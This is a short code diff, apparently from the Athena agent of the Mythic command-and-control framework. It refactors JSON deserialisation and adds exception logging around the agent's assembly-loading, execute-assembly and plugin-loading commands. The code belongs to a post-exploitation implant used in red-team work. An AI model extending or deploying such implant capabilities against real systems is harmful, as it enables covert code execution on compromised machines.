@@ -55,8 +55,9 @@ namespace Athena.Commands
                     }
                 }
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e);
                 return false;
             }
             return false;
@@ -69,7 +70,9 @@ namespace Athena.Commands
         {
             //This will load an assembly into our Assembly Load Context for usage with.
             //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
-            LoadAssembly la = JsonSerializer.Deserialize<LoadAssembly>(job.task.parameters);
+            LoadAssembly la = JsonSerializer.Deserialize(job.task.parameters, LoadAssemblyJsonContext.Default.LoadAssembly);
+
+
             try
             {
 
@@ -129,7 +132,7 @@ namespace Athena.Commands
                 }.ToJson();
             }
 
-            ExecuteAssemblyTask ea = JsonSerializer.Deserialize<ExecuteAssemblyTask>(job.task.parameters);
+            ExecuteAssemblyTask ea = JsonSerializer.Deserialize(job.task.parameters, ExecuteAssemblyTaskJsonContext.Default.ExecuteAssemblyTask);
             
             //Indicating an execute-assembly task is running.
             this.assemblyIsRunning = true;
@@ -226,7 +229,7 @@ namespace Athena.Commands
         /// <param name="job">MythicJob containing the assembly</param>
         public async Task<string> LoadCommandAsync(MythicJob job)
         {
-            LoadCommand command = JsonSerializer.Deserialize<LoadCommand>(job.task.parameters);
+            LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
 
             if (this.loadedPlugins.ContainsKey(command.command))
             {
